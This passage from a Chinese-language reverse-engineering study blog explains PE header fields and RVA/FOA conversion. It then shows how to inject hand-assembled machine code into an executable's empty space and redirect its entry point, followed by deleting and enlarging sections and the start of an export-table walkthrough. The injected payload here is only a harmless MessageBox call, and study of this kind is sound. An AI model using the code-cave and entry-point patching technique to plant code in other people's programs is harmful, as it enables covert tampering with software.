src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608140246.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608140218.png"></p><h5 id="Machine"><a href="#Machine" class="headerlink" title="Machine"></a><strong>Machine</strong></h5><p>两个字节，标记可以程序可以运行在什么样的CPU上。                                                           任意：<strong>0</strong> ；Intel 386以及后续：<strong>14C</strong>；x64：<strong>8664</strong></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608141338.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608141402.png"></p><h5 id="Number-of-Section"><a href="#Number-of-Section" class="headerlink" title="Number of Section"></a>Number of Section</h5><p>两个字节记录节的数目。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608141938.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608142002.png"></p><h5 id="TimeDateStamp"><a href="#TimeDateStamp" class="headerlink" title="TimeDateStamp"></a>TimeDateStamp</h5><p>时间戳，四个字节，在我的工具尚未能显示，我没有权限。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608142256.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608142319.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608143400.png"></p><p>程序的时间戳是指在Windows操作系统上编译或链接可执行文件时，由编译器或链接器自动插入的一个时间戳。它通常存储为32位无符号整数，表示从1970年1月1日00:00:00（格林威治时间）开始的秒数。可以更改。</p><h5 id="Pointer-to-Symbol-Table-amp-Number-of-Symbol"><a href="#Pointer-to-Symbol-Table-amp-Number-of-Symbol" class="headerlink" title="Pointer to Symbol Table &amp;Number of Symbol"></a>Pointer to Symbol Table &amp;Number of Symbol</h5><p>调试相关，不关注，共8个字节<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608143227.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608143423.png"></p><h5 id="Size-of-Optional-Header"><a href="#Size-of-Optional-Header" class="headerlink" title="Size of Optional  Header"></a>Size of Optional  Header</h5><p>两个字节，因为可选头长度是不固定的，该成员记录MAGE_OPTIONAL_HEADER的大小，32位默认是0xE0,64位默认是0xF0。如果可选头长度更改，也要对应修改这里。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608143754.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608143744.png"></p><h5 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h5><p>两个字节，记录文件属性<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608145505.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608145426.png"></p><p>010F –&gt;0000 0001 0000 1111,每一个位都有意义，比如下标为1的地方是1，那么代表该文件是可执行文件。</p><h4 id="IMAGE-OPTIONAL-HEADER-（扩展PE头）"><a href="#IMAGE-OPTIONAL-HEADER-（扩展PE头）" class="headerlink" title="IMAGE_OPTIONAL_HEADER （扩展PE头）"></a>IMAGE_OPTIONAL_HEADER （扩展PE头）<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608150619.png"></h4><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608151039.png"></p><h5 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h5><p>两个字节，标志程序是32位还是64位（最准确）。PE32：10B ；PE32+:20B<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608151300.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608151311.png"></p><h5 id="Address-of-Entry-Point"><a href="#Address-of-Entry-Point" class="headerlink" title="Address of Entry Point"></a>Address of Entry Point</h5><p>4个字节，程序的入口。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608151717.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608153437.png"></p><p>记录代码开始的位置，记录的是相对Image Base的距离。PE文件在内存中展开后最前面都是数据，需要一个值告诉操作系统从哪里开始运行。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608154414.png"></p><p>那么么该程序就从01000000+0000739D&#x3D;0100739D,     OD会在程序开始设置一个断点，地址就是这里。对这里进行修饰会增加逆向分析的难度，因为调试机器找不到程序入口。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608154708.png"></p><h5 id="Image-Base"><a href="#Image-Base" class="headerlink" title="Image Base"></a>Image Base</h5><p>4字节，<strong>内存</strong>镜像基址。对于32位机器，操作系统会位每个进程分配一个4GB的虚拟地址空间，之所以是4GB，是因为32位操作系统指针长度为4字节32为，所以寻址能力是2的32次方。该成员指明程序在虚拟地址空间的何处展开，即基地址。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608152911.png"></p><h5 id="Section-Alignment"><a href="#Section-Alignment" class="headerlink" title="Section Alignment"></a>Section Alignment</h5><p>内存对齐大小。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608155130.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608155207.png"></p><h5 id="File-Alignment"><a href="#File-Alignment" class="headerlink" title="File Alignment"></a>File Alignment</h5><p>文件对齐大小。</p><h5 id="Size-of-Image"><a href="#Size-of-Image" class="headerlink" title="Size of Image"></a>Size of Image</h5><p>文件在内存中展开时的大小。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608195924.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608200001.png"></p><h5 id="Size-of-Header"><a href="#Size-of-Header" class="headerlink" title="Size of Header"></a>Size of Header</h5><p>四字节，所有头+节表按照文件对齐后的大小。</p><h5 id="Checksum"><a href="#Checksum" class="headerlink" title="Checksum"></a>Checksum</h5><p>校验和，以两字节为单位，将所有的数据相加。用来判断程序是否受到修改，但是我们可以通过修改其他数值来平衡，所以意义不大。</p><h3 id="PE节表"><a href="#PE节表" class="headerlink" title="PE节表"></a>PE节表</h3><p>学习节表之前首先要知道PE文件的两种状态</p><p>即<strong>文件</strong>状态和<strong>内存</strong>状态<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608214913.png"></p><p>节表以结构体的形式描述节的信息，每个节表40字节<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608213320.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608214948.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608213615.png"></p><h5 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h5><p>8字节，当前节的名字，可以随意更改。</p><h5 id="Vitual-Size"><a href="#Vitual-Size" class="headerlink" title="Vitual Size"></a>Vitual Size</h5><p>当前这个节未对齐时的大小，即实际大小。实际大小有可能会比Size of Raw Data大，因为未初始化的全局变量在文件中是不占空间的。在内存中展开时以什么为基准呢？答案是谁大按谁，如果Vitual Size&gt;Size of Raw Data,则按照Vitual Size展开，反之则按照Size of Raw Data。</p><h5 id="VirtualAddress"><a href="#VirtualAddress" class="headerlink" title="VirtualAddress"></a>VirtualAddress</h5><p>在内存中的偏移地址，加上ImageBase则是内存中的真实地址。</p><h5 id="Size-of-Raw-Data"><a href="#Size-of-Raw-Data" class="headerlink" title="Size of Raw Data"></a>Size of Raw Data</h5><p>文件对齐后的大小，Vitual Size的值是7748，文件对其大小是100，Size of Raw Data的值为7800。</p><h5 id="Pointer-to-Raw-Data"><a href="#Pointer-to-Raw-Data" class="headerlink" title="Pointer to Raw Data"></a>Pointer to Raw Data</h5><p>当前节在文件中从何处开始<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608221450.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608221509.png"></p><h5 id="Charactenstics"><a href="#Charactenstics" class="headerlink" title="Charactenstics"></a>Charactenstics</h5><p>四字节，节的属性。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609012703.png"></p><p>60 00 00 20 –&gt;0110 0000 0000 0000 0000 0000 0010 0000<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609013111.png"></p><p>可以看到下标为5的位是1，代表该节中含有代码。</p><h3 id="RVA与FOA的转换"><a href="#RVA与FOA的转换" class="headerlink" title="RVA与FOA的转换"></a>RVA与FOA的转换</h3><p>用一个简单的程序开始RVA.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> c = <span class="number">123456</span>;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;全局变量的地址是：%p\n&quot;</span>, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;全局变量的值是：%d\n&quot;</span>, c);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的任务是通过地址找到该全局变量，然后改变它的值。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609022947.png"></p><p>我们运行程序，看到其地址是00bca000，这是在内存中的地址，我们知道PE文件在内存中和在文件中展开是不一样的，我们就是要通过内存中的这个地址找到文件中对应的位置。</p><h4 id="RVA"><a href="#RVA" class="headerlink" title="RVA"></a>RVA</h4><p>相对虚拟地址(Relative virtual address) <strong>RVA</strong>&#x3D;内存地址-ImageBase <img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609023025.png"></p><p>查看其Image Base得到 RVA&#x3D;D0A000-400000&#x3D;90 A000</p><h4 id="FOA"><a href="#FOA" class="headerlink" title="FOA"></a>FOA</h4><p>文件偏移地址(File offset address) <strong>FOA</strong></p><h4 id="转换过程"><a href="#转换过程" class="headerlink" title="转换过程"></a>转换过程</h4><ol><li>判断RVA是否在PE头部，如果在则<strong>RVA&#x3D;FOA</strong>，因为头部没有被拉伸</li><li>如果不在头部，判断RVA位于哪个节中 ，求出 差值&#x3D;RVA-节.VA,也就是该地址相对节头的距离。为什么要求差值？因为在文件和在内存中差值是相同的。                           FOA&#x3D;节.PointerToData+差值</li></ol><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609212516.png"></p><p>他的位置是在00CAA000处，这里的位置即内存中的位置，不用想，他肯定不在头中。我们必须将运行中的程序进行分析，因为基地址也是随机化的。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609212915.png"></p><p>Image Base&#x3D;00C90000，全局变量的地址是00CAA000<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609213106.png"></p><p>此处的RVA即在文件中的偏移量，由此我们确定全局变量在data节中，差值为0，那么我们查看该节在文件中的位置即Point to Raw Data&#x3D;8000.跳转到此处，其值为0001E240即十六进制的123456<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609213538.png"></p><p>修改并保存<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609213626.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230609213703.png"></p><p>我大为震惊。其实这个过程遇到了很多麻烦，基地址随机是在这个过程中认识到的。这个过程挺美妙的，虽然是个很简单的东西，却体现出了逆向的的思想与魅力。</p><h2 id="修改PE文件"><a href="#修改PE文件" class="headerlink" title="修改PE文件"></a>修改PE文件</h2><h3 id="在空白区域添加代码"><a href="#在空白区域添加代码" class="headerlink" title="在空白区域添加代码"></a>在空白区域添加代码</h3><p>我们要插入这样一个代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    MessageBox(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610021138.png"></p><p>功能呢就是弹出一个这样的错误窗口。这个程序的核心就是调用了一个messagebox函数弹出了一个窗口。由于我们是要对pe文件进行操作，所以肯定不是将代码写入，而是要将机器码插入。就是利于栈传第四个参数0，然后call。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610021641.png"></p><ol><li><p>构造要写入的代码 6A 00 6A 00 6A 00 6A 00 E8（call）xx xx，我们看到的FF是(near jump)要使用一个什么导入表（后面会学），而我们插入的时候E8利用相对便宜量调用函数。E8后面跟四个字节的相对偏移量offset，怎么计算？还好了解过汇编，offset&#x3D;要跳转的地方的地址-call指令下面一条指令的地址。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610022933.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610023052.png"></p><p>将图一标记位置改为call 1c1023 得到图二，后面的0A&#x3D;1c1023-1c1019.我们的目标指示让他弹出窗口，不能破坏程序运行，所以弹出之后我们还要跳回到初始位置，让程序正常运行，我们使用JMP（E9）指令来实现该操作，E9后面也是跟偏移量，用法与E8相同。找到messagebox的地址75858A70。根据call指令的位置来计算。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610031033.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610031802.png"></p><p>E8所在的位置是3A8，这是文件中的位置，我们要考虑的是运行时的位置，所以要把这个地址加上Image Base &#x3D;01000000,所以最后得到的                                    offset&#x3D;75858A70-010003A8-5&#x3D;7485 86C3.最后跳转到程序的入口处，查看可选头的成员入口值为739D加上Image Base得到0100739D.                                  offset&#x3D;0100739D-010003AD-5&#x3D;6FEB<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610034056.png"></p></li><li><p>将程序入口点指向我们插入的代码，</p><p>也就是修改扩展pe头里的入口值</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230610034457.png"></p></li></ol><p>在108处占4个字节，我们插入的程序起始位置是000003A0.然后，然后就没然后了，程序运行不起，ida和od看到的东西都很奇怪，延误了两天，这里我直接说一下才的坑，我随意找了一个空白处填充机器码，但后来发现不是所有的位置都能发生跳转，然后就将指令插入在了text段的末尾，然后发现跳转的有些差异，不会跳转在我设置的地方，后知后觉的发现，视频里的老哥演示的的时候拿的是一个文件对齐和内存对齐相同大小的程序，我用的程序是一个不同的，所以就要计算一下 用我们前面学习到的知识。下面理一下步骤</p><ol><li>首先在文件中确定一段空间，然后运行程序的时候查看 是否为空</li><li>插入，根据内存中的位置计算</li><li>改入口，内存中代码的起始位置<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230612183816.png"></li></ol><p>第一次尝试的时候成功弹出了窗口，但是关闭之后没有出现记事本，由此我们可以判断执行完我们的代码后，没有成功的返回原入口。此时才想起来补码写错了，插入的位置是87b0，入口点是739d，739d-83b0-5&#x3D;<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230612184514.png"></p><p>然后我就在e9后面填充了E8 EF 00 00,意识到返回出现问题后，想到了有符号数的符号扩展，应该扩展其符号位即1，所以正确的补码形式是FF FF EF E8,填充进去就是E8 EF FF FF.</p><h3 id="删除节"><a href="#删除节" class="headerlink" title="删除节"></a>删除节</h3><p>删除一个节比较简单，尤其是删除最后一个节，.reloc节区是基址重定位表，删除这个节区对程序的正常运行没有影响，而且删除这个节区可以将文件的大小缩减。下面说一下步骤：</p><ol><li>将.reloc节区头用0覆盖</li><li>删除reloc节区</li><li>修改Image_FILE_HEADER中的numberofsection成员</li><li>修改IMAGE_OPTIONAL_HEADER中的SizeofImage</li></ol><h4 id="覆盖-reloc节区头"><a href="#覆盖-reloc节区头" class="headerlink" title="覆盖.reloc节区头"></a>覆盖.reloc节区头</h4><p>28个字节</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143105.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143154.png"></p><h4 id="删除节区"><a href="#删除节区" class="headerlink" title="删除节区"></a>删除节区</h4><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143402.png"></p><p>因为是最后一个节区，所以我们只要将C000即后面的东西删除即可</p><h4 id="修改Image-FILE-HEADER"><a href="#修改Image-FILE-HEADER" class="headerlink" title="修改Image_FILE_HEADER"></a>修改Image_FILE_HEADER</h4><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143559.png"></p><p>将5改成4即可</p><h4 id="修改IMAGE-OPTIONAL-HEADER"><a href="#修改IMAGE-OPTIONAL-HEADER" class="headerlink" title="修改IMAGE_OPTIONAL_HEADER"></a>修改IMAGE_OPTIONAL_HEADER</h4><p>原来程序在内存中展开的大小为11000</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143749.png"></p><p>减去删除的节在内存中展开的大小即可<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626143805.png"></p><p>尝试运行，一切正常。左边是删除roloc节区的程序，可以看到大小发生了改变。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230626142054.png"></p><h3 id="扩大节"><a href="#扩大节" class="headerlink" title="扩大节"></a>扩大节</h3><p><strong>为什么要扩大节？</strong></p><p>前面演示插入的代码很短，如果要插入一段比较长的代码，可能找不到合适的空间。常见的解决方案就是扩大节，那么扩大哪一个节呢？<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230608032628.png"></p><p>根据这个图不难看出，最好是扩大最后一个节，因为扩大前面的节如果想不影响程序的正常运行，还要去修改节表里的属性。</p><p><strong>扩大节的步骤</strong></p><ol><li>分配空间</li><li>修改SizeofRawData和VirtualSize</li><li>修改SizeofImage（内存对齐大小）</li><li>如果扩展的节没有可执行属性，我们可以在节表结构体更改其属性。</li></ol><p>1.分配一块新的空间,大小为S，这里我们选择在最后一个节后面分配0x1000byte的空间<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230613030824.png"></p><p>2.修改该节节表信息。要修改Size of Raw Data（实际大小）和Virtual Size（文件对齐后的大小），将这两个值修改为N。从前面的学习，我们了解到文件对其后的大小不一定大于实际大小，我们只需选择其中那个大的值max，N&#x3D;max+S。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230613032013.png"></p><p>将这两个位置改为9400</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230613032216.png"></p><p>3.修改Size of Image（扩展pe头成员）即文件在内存中展开后的大小。SizeofImage就是内存对其后的大小。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230613032917.png"></p><p>将该值按照内存对齐之后，再加上新增的0x1000即可，修改完保存，程序正常运行。</p><h3 id="新增节"><a href="#新增节" class="headerlink" title="新增节"></a>新增节</h3><h3 id="合并节"><a href="#合并节" class="headerlink" title="合并节"></a>合并节</h3><h2 id="详解导入导出表"><a href="#详解导入导出表" class="headerlink" title="详解导入导出表"></a>详解导入导出表</h2><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><p>前置知识，一个可执行程序是有<strong>多个pe文件组成</strong>的。</p><p><strong>导入表</strong>：描述pe文件引用了哪些文件，相当于进货清单。</p><p><strong>导出表</strong>：当前pe文件提供哪些函数供其他文件使用，相当于饭店的菜单。</p><h4 id="导出表在哪里？"><a href="#导出表在哪里？" class="headerlink" title="导出表在哪里？"></a>导出表在哪里？</h4><p>在扩展pe头，最后一个成员，是个结构体数组，这个结构体的第一个成员就存放着导出表的相关信息。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230616021827.png"></p><p>第一个成员名字就叫导出表，用peview查看<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230616022003.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230616022108.png"></p><p>导出表的第一个成员<strong>VirtualAddress</strong>记录着内存偏移地址(RVA)，<strong>Size</strong>记录着导出表的大小。</p><p>我们动一下手，拿keyHook.dll试试手<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230817165959.png"></p><p>RVA是80B0，查了一下在rdata段，rdata段的起始RVA为6000，所以相对地址就是20B0，rdata段的pointer to raw data及文件偏移地址为5000，所以他的FOA为70B0，大小是5B字节。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230817170505.png"></p><p>导出表的成分是非常复杂的<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230817170614.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230817170716.png">它还含有三张子表格，我们可以看到这是40字节的内容，而我们刚才查看的是5B字节，其实这个5B是算上子表之后的大小。</p><h4 id="Name-1"><a href="#Name-1" class="headerlink" title="Name"></a>Name</h4><p>name指针，对应的值是000080EC，对应的FOA是70EC<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230817172218.png"></p><p>指向一个ascii字符串（当前dll的名称），0表示结尾。</p><h4 id="NumberOfFunctions"><a href="#NumberOfFunctions" class="headerlink" title="NumberOfFunctions"></a>NumberOfFunctions</h4><p>所有导出函数的个数</p><h4 id="NumberOfNames"><a href="#NumberOfNames" class="headerlink" title="NumberOfNames"></a>NumberOfNames</h4><p>根据函数名到处函数的个数，除了根据函数名导出函数，还能根据序号，也就是启用函数名定义一套序号规则，在一定程度上，通过序号导出函数能够增加程序的分析难度。</p><h4 id="AddressOfFunctions"><a href="#AddressOfFunctions" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h4><p>导出函数地址表RVA，又是一张表，表的成员每一个都是<strong>四字节</strong>大小，代表的是函数所在的地址。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230821154814.png"></p><h4 id="AddressOfNames"><a href="#AddressOfNames" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>导出函数名称表。存储的函数名称所在的地址。每个成员<strong>四字节</strong>大小。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230821155029.png"></p><p><img 